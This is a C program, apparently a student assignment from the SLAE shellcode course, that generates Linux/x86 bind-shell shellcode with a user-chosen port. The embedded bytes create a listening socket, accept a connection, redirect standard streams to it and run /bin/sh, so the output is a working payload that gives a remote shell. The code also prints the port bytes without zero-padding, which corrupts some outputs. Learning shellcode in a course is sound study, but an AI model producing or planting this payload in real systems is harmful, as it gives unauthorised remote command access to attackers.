// SLAE - Assignment #1: Configurable port for Shell Bind TCP (Linux/x86) 
// Author:  Dipsy 
// Student ID: SLAE-1535

#include<stdio.h>
#include <stdlib.h>

unsigned char code[] = \
"\x29\xc0\xb0\x66\x29\xdb\xb3\x01\x29\xc9\x51\x53\x6a\x02\x89\xe1\xcd\x80\x89\xc6\xb0\x66\xb3\x02\x29\xd2\x52\x66\x68"
"\x90" //tag  
"\x66\x53\x89\xe1\x6a\x10\x51\x56\x89\xe1\xcd\x80\x29\xc0\x50\x56\x89\xe1\xb3\x04\xb0\x66\xcd\x80\x29\xd2\x52\x52\x56"
"\x89\xe1\xb3\x05\xb0\x66\xcd\x80\x89\xc3\x29\xc9\xb1\x02\xb0\x3f\xcd\x80\x49\x79\xf9\x52\x68\x2f\x2f\x73\x68\x68\x2f"
"\x62\x69\x6e\x89\xe3\x89\xd1\xb0\x0b\xcd\x80";

int main(int argc, char* argv[]){
    if (argc < 2)
        printf("Enter a port number");
    else if (argc == 2) {
        int port = atoi(argv[1]); 

        if (port < 0 || port > 65535)
            printf("Port number should be between 0-65535");
        else {
            for (size_t i = 0; i < sizeof(code)-1; i++)
            {

                if (code[i] == 0x90) {
                    
                    printf("\\x%x\\x%x", port >> 8, port & 0xff);
                }
                else
                    printf("\\x%02hhx", code[i]);
            }
            
            }        
        }
    }
